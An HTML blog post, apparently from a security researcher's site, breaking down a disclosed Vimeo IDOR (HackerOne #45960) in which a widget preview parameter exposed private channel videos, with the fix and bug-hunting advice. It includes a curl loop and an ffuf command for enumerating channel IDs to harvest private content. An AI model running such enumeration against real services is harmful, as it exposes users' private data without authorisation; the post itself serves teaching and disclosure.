@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="IDOR on Vimeo — HackerOne #45960. How the Montage Widget preview tool's badge_channel parameter bypassed Vimeo's private channel access controls, exposing videos of any private channel to any unauthenticated visitor." />
+  <title>IDOR: Access Videos of Any Private Vimeo Channel via Montage Widget — HackerOne #45960 | Blog — Darshak Patel</title>
+  <link rel="stylesheet" href="../../assets/css/style.css" />
+  <link rel="stylesheet" href="../../assets/css/pages/post.css" />
+</head>
+<body>
+
+<div class="read-progress" id="read-progress"></div>
+<canvas id="particles"></canvas>
+
+<nav>
+  <a href="../../index.html" class="nav-logo">
+    <span class="bracket">[</span>dp<span class="bracket">]</span>
+  </a>
+  <ul class="nav-links">
+    <li><a href="../../pages/about.html">about</a></li>
+    <li><a href="../../pages/expertise.html">expertise</a></li>
+    <li><a href="../../pages/certifications.html">certifications</a></li>
+    <li><a href="../../pages/achievements.html">achievements</a></li>
+    <li><a href="../../pages/tools.html">tools</a></li>
+    <li><a href="../../pages/resources.html">resources</a></li>
+    <li><a href="../index.html" class="active">blog</a></li>
+    <li><a href="../../pages/contact.html">contact</a></li>
+  </ul>
+  <a href="mailto:your@email.com" class="nav-cta">Hire Me</a>
+  <div class="nav-hamburger" aria-label="menu">
+    <span></span><span></span><span></span>
+  </div>
+</nav>
+
+<div class="post-wrap">
+
+  <!-- ── Hero ── -->
+  <div class="post-hero" data-vuln="idor">
+    <div class="post-hero-inner">
+      <a href="../index.html" class="post-back">← Back to Blog</a>
+      <div class="post-vuln-badge">⬡ IDOR</div>
+      <div class="post-meta">
+        <span class="post-tag">Bug Bounty</span>
+        <span class="post-tag">Web App</span>
+        <span class="post-tag" data-sev="critical">Critical</span>
+        <span class="post-meta-sep">·</span>
+        <span>Jul 4, 2025</span>
+        <span class="post-meta-sep">·</span>
+        <span>8 min read</span>
+      </div>
+      <h1 class="post-h1">IDOR: Access Videos of Any Private Vimeo Channel via Montage Widget — HackerOne #45960</h1>
+      <p class="post-sub">How Vimeo's Montage Widget preview tool exposed every video in any private channel through a single unvalidated <code>badge_channel</code> parameter — completely bypassing the access controls that correctly blocked the channel page itself.</p>
+      <div class="post-stats">
+        <div class="post-stat">
+          <span class="post-stat-label">Program</span>
+          <span class="post-stat-value">Vimeo</span>
+        </div>
+        <div class="post-stat">
+          <span class="post-stat-label">Report</span>
+          <span class="post-stat-value">#45960</span>
+        </div>
+        <div class="post-stat">
+          <span class="post-stat-label">Outcome</span>
+          <span class="post-stat-value">Resolved + Bounty</span>
+        </div>
+        <div class="post-stat">
+          <span class="post-stat-label">Reporter</span>
+          <span class="post-stat-value">@coolboss</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-body">
+    <a href="https://hackerone.com/reports/45960" target="_blank" rel="noopener" class="post-source">
+      ↗ HackerOne Report #45960 — Vimeo
+    </a>
+    <p class="post-attr">Independent educational breakdown of a publicly disclosed report. Credit for the original finding belongs to @coolboss (Pranav).</p>
+  </div>
+
+  <div class="post-layout">
+
+    <aside class="post-toc">
+      <div class="toc-label">Contents</div>
+      <ul class="toc-list">
+        <li><a href="#background">Background</a></li>
+        <li><a href="#context">The Target</a></li>
+        <li><a href="#discovery">How It Was Found</a></li>
+        <li><a href="#bug">The Bug</a></li>
+        <li><a href="#url">The Vulnerable URL</a></li>
+        <li><a href="#poc">Proof of Concept</a></li>
+        <li><a href="#impact">Real-World Impact</a></li>
+        <li><a href="#secondary-endpoints">The Secondary Endpoint Problem</a></li>
+        <li><a href="#fix">The Fix</a></li>
+        <li><a href="#hunting">How to Hunt It</a></li>
+        <li><a href="#refs">References</a></li>
+      </ul>
+    </aside>
+
+    <article class="post-article">
+
+      <h2 id="background">Background</h2>
+      <p><strong>Insecure Direct Object Reference (IDOR)</strong> is an access control vulnerability where a server exposes a direct identifier for an internal object and fails to verify whether the requesting user is authorised to access it. The fix is always one check — ownership or permission — on the server side. The absence of that check is the entire vulnerability.</p>
+      <p>This report — submitted by @coolboss (Pranav) on <strong>31 January 2015</strong> and disclosed on <strong>18 March 2015</strong> — is a textbook example of a class of IDOR that is especially common in large applications: the <strong>secondary endpoint bypass</strong>. The main feature (Vimeo's channel page) was correctly locked down. A supporting tool (the Montage Widget previewer) was not — and that tool provided a clean back door to every private channel on the platform.</p>
+      <p>Vimeo resolved the issue and awarded a bounty. The reporter titled it <em>"CRITICAL vulnerability"</em> — and the impact justifies that characterisation entirely.</p>
+
+      <h2 id="context">The Target</h2>
+      <p>Vimeo is a video-hosting platform with a strong focus on creator privacy. One of its core features is <strong>private channels</strong> — curated collections of videos that the channel owner restricts to <em>"Only moderators and people I choose"</em>. When a non-member visits a private channel URL, Vimeo correctly blocks them:</p>
+
+      <div class="post-code">
+        <div class="post-code-header">
+          <div class="post-code-dots"><span></span><span></span><span></span></div>
+          <span class="post-code-label">Private channel page — access correctly blocked</span>
+        </div>
+        <pre><code><span class="cc"># Visiting a private channel URL as a non-member</span>
+<span class="ck">GET</span> https://vimeo.com/channels/<span class="ch">870575</span>
+
+<span class="cc"># Server response: access denied page</span>
+<span class="cv">Private Channel</span>
+Sorry, this Channel is private.
+You do not have permission to view this Channel.</code></pre>
+      </div>
+
+      <p>Vimeo also offers a tool called the <strong>Montage Widget</strong> — a widget builder at <code>/tools/widget/montage</code> that lets creators generate embeddable video carousels for their websites. The widget can be configured to pull videos from a user's uploads, an album, or a <strong>channel</strong>. A preview mode lets the creator see how the widget will look before embedding it.</p>
+      <p>That preview mode is where the access control was missing.</p>
+
+      <h2 id="discovery">How It Was Found</h2>
+      <p>@coolboss was testing Vimeo with Burp Suite running as a proxy, intercepting all outgoing requests. While using the Montage Widget builder tool, they intercepted the requests made during the preview step. Two requests stood out:</p>
+      <ol>
+        <li>The initial page load: <code>GET /tools/widget/montage</code></li>
+        <li>The preview request, which contained a full set of configuration parameters including <strong><code>badge_channel=870575</code></strong> — the channel ID being previewed.</li>
+      </ol>
+      <p>The researcher's instinct was immediate: <em>what happens if I change <code>badge_channel</code> to the ID of a private channel I don't have access to?</em> The answer turned out to be: <strong>the private channel's videos are returned in full</strong>.</p>
+
+      <div class="post-note" data-type="tip"><strong>Hunter's instinct:</strong> widget builders, embed configurators, share preview tools, and export features are fertile ground for IDOR. They are secondary functionality — built to help creators — and developers often apply access control on the primary content paths (channel page, video page) but forget to replicate those checks on the supporting tooling. Always intercept every request a tool generates, not just the obvious ones.</div>
+
+      <h2 id="bug">The Bug</h2>
+      <p>The Montage Widget preview endpoint accepted a <code>badge_channel</code> parameter and returned the channel's videos for rendering in the widget preview — <strong>with absolutely no check that the requesting user was a member of, or had been granted access to, that channel</strong>.</p>
+      <p>Vimeo had implemented the privacy check in one place: the channel page renderer. But the widget preview tool was an entirely separate code path that fetched channel content independently — and that code path was missing the access control layer entirely.</p>
+      <p>The result: the privacy setting on the channel page was meaningless. Any user who knew (or could guess) a channel ID could bypass the "Private Channel" block by simply routing their request through the widget previewer instead of the channel page.</p>
+
+      <div class="post-code">
+        <div class="post-code-header">
+          <div class="post-code-dots"><span></span><span></span><span></span></div>
+          <span class="post-code-label">Access control gap — channel page vs widget tool</span>
+        </div>
+        <pre><code><span class="cc">── Channel page (access correctly enforced) ────────────────────</span>
+<span class="ck">GET</span> https://vimeo.com/channels/<span class="ch">870575</span>
+<span class="cc"># ✓ Checks: is channel public?</span>
+<span class="cc"># ✓ Checks: is user an approved member?</span>
+<span class="cc"># Result: 403 — "Private Channel. You do not have permission."</span>
+
+<span class="cc">── Widget preview tool (NO access check at all) ────────────────</span>
+<span class="ck">GET</span> /tools/widget/montage?badge_stream=channel&amp;<span class="cv">badge_channel=</span><span class="ch">870575</span>&amp;...
+<span class="cc"># ✗ NO check: is channel public?</span>
+<span class="cc"># ✗ NO check: is user an approved member?</span>
+<span class="cc"># Result: 200 — private channel videos returned in widget preview</span></code></pre>
+      </div>
+
+      <p>The privacy model had a single enforcement point when it needed at least two. Any code path that can deliver channel content must enforce the same access rules as the channel page — the widget tool was a second delivery path with no gate.</p>
+
+      <h2 id="url">The Vulnerable URL</h2>
+      <p>@coolboss included the exact working URL in the report. Every parameter is documented here:</p>
+
+      <div class="post-code">
+        <div class="post-code-header">
+          <div class="post-code-dots"><span></span><span></span><span></span></div>
+          <span class="post-code-label">Full vulnerable Montage Widget preview URL from the report</span>
+        </div>
+        <pre><code>https://vimeo.com/tools/widget/montage
+  ?widget=<span class="cok">1</span>              <span class="cc">← enables widget mode</span>
+  &amp;preview=<span class="cok">1</span>             <span class="cc">← enables preview rendering</span>
+  &amp;user_id=<span class="cv">36807051</span>      <span class="cc">← reporter's own user ID (not the victim's)</span>
+  &amp;badge_stream=<span class="cf">channel</span>  <span class="cc">← content source: channel (vs album, user)</span>
+  &amp;<span class="cv">badge_channel=</span><span class="ch">870575</span>  <span class="cc">← ← ← THE VULNERABLE PARAMETER (private channel ID)</span>
+  &amp;badge_album=<span class="cv">3231945</span>   <span class="cc">← album ID (irrelevant when stream=channel)</span>
+  &amp;badge_layout=<span class="cf">horizontal</span>
+  &amp;badge_quantity=<span class="cn">6</span>       <span class="cc">← number of videos to return</span>
+  &amp;show_titles=<span class="cv">no</span>
+  &amp;badge_size=<span class="cn">80</span>          <span class="cc">← thumbnail size in pixels</span></code></pre>
+      </div>
+
+      <p>A few critical observations from this URL:</p>
+      <ul>
+        <li><strong><code>user_id=36807051</code> is the reporter's own user ID</strong> — not the channel owner's ID. The server used the <code>badge_channel</code> parameter to look up content, completely independently of <code>user_id</code>. The channel access check should have been against the authenticated session — not the <code>user_id</code> parameter, which itself is attacker-supplied.</li>
+        <li><strong><code>badge_stream=channel</code> is the mode switch.</strong> Changing this to <code>user</code> or <code>album</code> would pull from a different source. The bug is specifically in the <code>channel</code> stream mode — but the pattern suggests <code>album</code> and <code>user</code> stream modes should also be tested for similar access control gaps.</li>
+        <li><strong>No authentication token in the URL.</strong> The request relies on a session cookie (standard Vimeo authentication) — meaning the check needed was a server-side session-to-channel-membership lookup. That check was entirely absent.</li>
+      </ul>
+
+      <h2 id="poc">Proof of Concept</h2>
+      <p>The PoC was elegantly simple — no Burp required, no script needed. It was a direct browser URL:</p>
+      <ol>
+        <li>Navigate to <code>https://vimeo.com/channels/870575</code>. Observe: <em>"Private Channel — Sorry, this Channel is private. You do not have permission to view this Channel."</em> — access correctly denied.</li>
+        <li>Navigate directly to the Montage Widget preview URL with <code>badge_channel=870575</code>.</li>
+        <li><strong>Result:</strong> the private channel's videos are displayed in the widget preview — thumbnails, titles (if enabled), and video links — with no authentication or membership check whatsoever.</li>
+        <li>Enumerate <code>badge_channel</code> to any other valid channel ID. Videos from that channel are returned, regardless of its privacy setting.</li>
+      </ol>
+      <p>The reporter backed this with a <strong>video PoC</strong> hosted as an unlisted YouTube video (<code>http://youtu.be/vRAtxovcfHs</code>), showing the channel page blocked access and then the widget URL serving the same private channel's videos.</p>
+
+      <div class="post-code">
+        <div class="post-code-header">
+          <div class="post-code-dots"><span></span><span></span><span></span></div>
+          <span class="post-code-label">Enumeration — iterating badge_channel across channel IDs</span>
+        </div>
+        <pre><code><span class="cc"># Enumerate badge_channel values to harvest private channel contents at scale</span>
+<span class="cc"># badge_quantity=6 returns up to 6 videos per request</span>
+<span class="ck">for</span> id <span class="ck">in</span> $(seq <span class="cn">860000</span> <span class="cn">880000</span>); <span class="ck">do</span>
+  curl -s \
+    <span class="cf">"https://vimeo.com/tools/widget/montage?widget=1&amp;preview=1&amp;user_id=36807051"</span> \
+    <span class="cf">"&amp;badge_stream=channel&amp;badge_channel=${id}&amp;badge_quantity=6"</span> \
+    -b <span class="cs">"vimeo=YOUR_SESSION"</span> \
+    | grep -o <span class="cv">'vimeo\.com/[0-9]\+'</span>  <span class="cc"># extract video URLs from response</span>
+<span class="ck">done</span>
+
+<span class="cc"># Each line of output = a video URL from a private channel</span>
+<span class="cc"># No membership or access check — all return 200 with content</span></code></pre>
+      </div>
+
+      <div class="post-note"><strong>No victim interaction required.</strong> This attack is entirely passive from the victim's perspective — they receive no notification, no access log alert, nothing. A private channel owner has no way to know their content was accessed via the widget tool.</div>
+
+      <h2 id="impact">Real-World Impact</h2>
+      <p>The reporter correctly labelled this <strong>CRITICAL</strong>. Here is why that characterisation holds:</p>
+      <ul>
+        <li><strong>Every private channel on Vimeo was affected.</strong> The <code>badge_channel</code> parameter accepted any valid channel ID. With Vimeo hosting millions of channels, the blast radius was platform-wide — every private channel was vulnerable, not just specific ones.</li>
+        <li><strong>Channel IDs are integers and likely enumerable.</strong> The PoC used channel ID <code>870575</code> — a 6-digit integer. Sequential or near-sequential IDs mean a loop script can systematically harvest the video contents of thousands of private channels with no special knowledge of the targets.</li>
+        <li><strong>Videos on private channels represent the most sensitive content on the platform.</strong> Vimeo is used by film studios for unreleased cuts, advertising agencies for pre-launch campaign materials, enterprises for confidential internal communications, and individuals for personal content they explicitly chose to keep private. This IDOR exposed all of it.</li>
+        <li><strong>No authentication required beyond a basic Vimeo account.</strong> Any free Vimeo account — anyone who could sign up — could exploit this. The barrier to entry was zero.</li>
+        <li><strong>No special knowledge of the target needed.</strong> Because IDs are enumerable, the attacker does not need to know a specific channel exists. They iterate IDs and collect whatever is returned — making this a bulk data harvesting vulnerability, not just a targeted one.</li>
+      </ul>
+
+      <div class="post-note" data-type="tip"><strong>Why the reporter wrote "CRITICAL":</strong> scope (every private channel on the platform), ease of exploitation (direct URL, no tools required), impact sensitivity (private video content), and automation potential (sequential IDs + a loop). When all four of these factors align, Critical is the accurate label — not an exaggeration.</div>
+
+      <h2 id="secondary-endpoints">The Secondary Endpoint Problem</h2>
+      <p>This finding perfectly illustrates one of the most persistent architectural mistakes in web application security: <strong>access control enforced only at the primary entry point, but not replicated to every code path that serves the same data</strong>.</p>
+      <p>In large applications, the same underlying data — here, a channel's video list — can be served through multiple paths:</p>
+
+      <div class="post-code">
+        <div class="post-code-header">
+          <div class="post-code-dots"><span></span><span></span><span></span></div>
+          <span class="post-code-label">Multiple data paths — each needs its own access check</span>
+        </div>
+        <pre><code><span class="cc">── All paths that can serve a channel's video list ─────────────</span>
+
+<span class="cc"># 1. Channel page (access check: ✓ present)</span>
+<span class="ck">GET</span> /channels/<span class="ch">870575</span>
+
+<span class="cc"># 2. Widget preview tool (access check: ✗ MISSING — this report)</span>
+<span class="ck">GET</span> /tools/widget/montage?badge_channel=<span class="ch">870575</span>
+
+<span class="cc"># 3. Embed endpoint — also needs checking</span>
+<span class="ck">GET</span> /channels/<span class="ch">870575</span>/videos.json
+
+<span class="cc"># 4. API endpoint — also needs checking</span>
+<span class="ck">GET</span> /api/v2/channel/<span class="ch">870575</span>/videos.json
+
+<span class="cc"># 5. RSS feed — also needs checking</span>
+<span class="ck">GET</span> /channels/<span class="ch">870575</span>/videos/rss
+
+<span class="cc"># The correct model: access control lives at the DATA LAYER,</span>
+<span class="cc"># not at individual endpoint handlers — so every path inherits it.</span></code></pre>
+      </div>
+
+      <p>The root cause is that Vimeo's access control check was implemented in the <strong>channel page controller</strong> rather than in a <strong>shared service layer</strong> that all code paths call when fetching channel content. When the widget tool was built, it fetched channel data directly — bypassing the controller that held the check.</p>
+      <p>The fix for this class of bug is architectural: move the authorization check to the data access layer (the function that retrieves channel videos), so that every caller — regardless of which endpoint triggered the request — goes through the same gate automatically.</p>
+
+      <h2 id="fix">The Fix</h2>
+      <p>The immediate fix is to add a channel membership/access check inside the Montage Widget preview handler before fetching and returning any channel content. The correct long-term fix is to enforce access control at the data layer:</p>
+
+      <div class="post-code">
+        <div class="post-code-header">
+          <div class="post-code-dots"><span></span><span></span><span></span></div>
+          <span class="post-code-label">Pseudocode — before and after the fix</span>
+        </div>
+        <pre><code><span class="cc"># Before the fix — widget handler fetches channel content with no access check</span>
+<span class="ck">def</span> <span class="cf">montage_widget_preview</span>(badge_channel, user_id, ...):
+    videos = Channel.find(badge_channel).videos   <span class="cc"># ← no check</span>
+    <span class="ck">return</span> render_widget(videos)
+
+<span class="cc"># After the fix (option A) — inline check in the widget handler</span>
+<span class="ck">def</span> <span class="cf">montage_widget_preview</span>(badge_channel, user_id, ...):
+    channel = Channel.find(badge_channel)
+    <span class="ck">if</span> channel.<span class="cv">private</span> <span class="ck">and not</span> current_user.<span class="cv">member_of</span>(channel):
+        <span class="ck">return</span> <span class="ch">403 Forbidden</span>
+    videos = channel.videos
+    <span class="ck">return</span> render_widget(videos)
+
+<span class="cc"># After the fix (option B — preferred) — access check in the data layer</span>
+<span class="ck">def</span> <span class="cf">get_channel_videos</span>(channel_id, requesting_user):
+    channel = Channel.find(channel_id)
+    <span class="ck">if</span> channel.<span class="cv">private</span> <span class="ck">and not</span> requesting_user.<span class="cv">member_of</span>(channel):
+        <span class="ck">raise</span> AccessDenied
+    <span class="ck">return</span> channel.videos   <span class="cc"># ← all callers inherit this check automatically</span>
+
+<span class="cc"># Every endpoint — channel page, widget, API, RSS — calls get_channel_videos()</span>
+<span class="cc"># The check runs once, in one place, for all code paths.</span></code></pre>
+      </div>
+
+      <p>Option B is the right architectural solution. It means the developer of any new feature that fetches channel videos gets the access check for free — they cannot accidentally omit it because it is baked into the only function allowed to retrieve that data.</p>
+
+      <h2 id="hunting">How to Hunt IDOR on Widget / Embed / Tool Endpoints</h2>
+      <ul>
+        <li>
+          <strong>Map every secondary tool that touches protected content.</strong>
+          Widget builders, embed generators, share preview pages, export tools, RSS feeds, and API endpoints are all secondary paths. Use Burp's site map to capture every request made while interacting with these tools. Each one is a potential access control gap.
+        </li>
+        <li>
+          <strong>Identify every parameter that looks like a resource ID.</strong>
+          In this report: <code>badge_channel</code>, <code>badge_album</code>, <code>user_id</code>. Any parameter that accepts an integer ID for a piece of content is worth testing. Test each one independently — swap it to an ID you do not own and observe the response.
+        </li>
+        <li>
+          <strong>Test the same resource ID across all the paths you found.</strong>
+          If a private channel ID is blocked on the channel page, try it in: the embed URL, the API endpoint (<code>/api/v2/channel/{id}/videos.json</code>), the RSS feed (<code>/channels/{id}/videos/rss</code>), the widget tool, and any mobile API endpoints. One of those paths may have missed the access check.
+        </li>
+        <li>
+          <strong>Check different stream/mode parameters.</strong>
+          In this report, <code>badge_stream=channel</code> triggered the vulnerable code path. Parameters like <code>stream</code>, <code>mode</code>, <code>type</code>, <code>source</code>, and <code>feed</code> often switch between different backend handlers — each of which may have its own (absent) access control. Test all possible values.
+        </li>
+        <li>
+          <strong>No authentication doesn't mean no IDOR.</strong>
+          Some widget and embed endpoints are designed to work without a login (so the embedded widget works for anonymous viewers of the embedding site). This design choice makes the missing access check even more severe — no Vimeo account at all may be needed to exploit it.
+        </li>
+        <li>
+          <strong>Enumerate at scale once confirmed.</strong>
+          Once you confirm the bug with your own test channel, document the range of affected IDs using a curl loop or ffuf. This demonstrates the blast radius and strengthens the severity argument in your report. Use only your own test channels for the PoC — document the scale by counting IDs, not by harvesting real content.
+        </li>
+      </ul>
+
+      <div class="post-code">
+        <div class="post-code-header">
+          <div class="post-code-dots"><span></span><span></span><span></span></div>
+          <span class="post-code-label">ffuf — test badge_channel across a range of IDs</span>
+        </div>
+        <pre><code><span class="cc"># Confirm scale — test a range of badge_channel values</span>
+<span class="cc"># Look for 200 responses with non-trivial content-length (videos returned)</span>
+ffuf -u <span class="cf">"https://vimeo.com/tools/widget/montage?widget=1&amp;preview=1&amp;user_id=YOUR_ID&amp;badge_stream=channel&amp;badge_channel=FUZZ&amp;badge_quantity=6"</span> \
+     -H <span class="cs">"Cookie: vimeo=YOUR_SESSION"</span> \
+     -w <span class="cv">&lt;(seq 860000 880000)</span> \
+     -mc <span class="cn">200</span> \
+     -fs <span class="cn">50</span>     <span class="cc"># filter out near-empty responses (channels with no videos)</span>
+
+<span class="cc"># Each result = a channel whose videos are accessible via the widget tool</span>
+<span class="cc"># Cross-reference against the channel page — if the channel page blocks you</span>
+<span class="cc"># but the widget returns videos, that's your confirmed IDOR.</span></code></pre>
+      </div>
+
+      <div class="post-note"><strong>Responsible disclosure:</strong> when confirming this IDOR, use only private channels you own yourself. Create a private channel with a test video, confirm the widget tool returns it from a second account, then stop. Document the confirmed gap with your own test data. Do not enumerate or harvest content from real users' private channels — the existence of the vulnerability is proven from your own test data alone.</div>
+
+      <hr class="post-divider" />
+
+      <h2 id="refs">References</h2>
+      <ul class="post-refs">
+        <li><a href="https://hackerone.com/reports/45960" target="_blank" rel="noopener">[1] HackerOne Report #45960 — IDOR: Access videos of any private Vimeo channel via Montage Widget</a></li>
+        <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References" target="_blank" rel="noopener">[2] OWASP WSTG — Testing for Insecure Direct Object References</a></li>
+        <li><a href="https://portswigger.net/web-security/access-control/idor" target="_blank" rel="noopener">[3] PortSwigger Web Security Academy — IDOR</a></li>
+        <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">[4] OWASP IDOR Prevention Cheat Sheet</a></li>
+        <li><a href="https://cwe.mitre.org/data/definitions/639.html" target="_blank" rel="noopener">[5] CWE-639 — Authorization Bypass Through User-Controlled Key</a></li>
+        <li><a href="https://cwe.mitre.org/data/definitions/284.html" target="_blank" rel="noopener">[6] CWE-284 — Improper Access Control</a></li>
+      </ul>
+
+      <div class="post-nav">
+        <a href="./blog-h1-52181-idor-vimeo-private-comment.html" class="post-nav-link">
+          <span class="post-nav-dir">← Previous Post</span>
+          <span class="post-nav-title">IDOR: Read Any Private Comment on Vimeo via comment_edit_form #52181</span>
+        </a>
+      </div>
+
+    </article>
+  </div>
+
+</div>
+
+<footer>
+  <p>© 2025 <span class="f-name">Darshak Patel</span> · B.Tech CSE Cybersecurity</p>
+  <div class="f-links">
+    <a href="../../index.html">Home</a>
+    <a href="../../pages/about.html">About</a>
+    <a href="../../pages/expertise.html">Expertise</a>
+    <a href="../../pages/certifications.html">Certifications</a>
+    <a href="../../pages/achievements.html">Achievements</a>
+    <a href="../../pages/tools.html">Tools</a>
+    <a href="../../pages/resources.html">Resources</a>
+    <a href="../index.html">Blog</a>
+    <a href="../../pages/contact.html">Contact</a>
+  </div>
+</footer>
+
+<script src="../../assets/js/main.js"></script>
+<script>
+  (function () {
+    const bar = document.getElementById('read-progress');
+    function update() {
+      const h = document.documentElement;
+      const pct = (h.scrollTop / (h.scrollHeight - h.clientHeight)) * 100;
+      bar.style.width = Math.min(pct, 100) + '%';
+    }
+    window.addEventListener('scroll', update, { passive: true });
+    update();
+  })();
+  (function () {
+    const links = document.querySelectorAll('.toc-list a');
+    const headings = Array.from(document.querySelectorAll('.post-article h2[id]'));
+    if (!links.length || !headings.length) return;
+    function onScroll() {
+      const top = window.scrollY + 100;
+      let active = headings[0];
+      for (const h of headings) { if (h.offsetTop <= top) active = h; }
+      links.forEach(l => l.classList.toggle('active', l.getAttribute('href') === '#' + active.id));
+    }
+    window.addEventListener('scroll', onScroll, { passive: true });
+    onScroll();
+  })();
+</script>
+</body>
+</html>
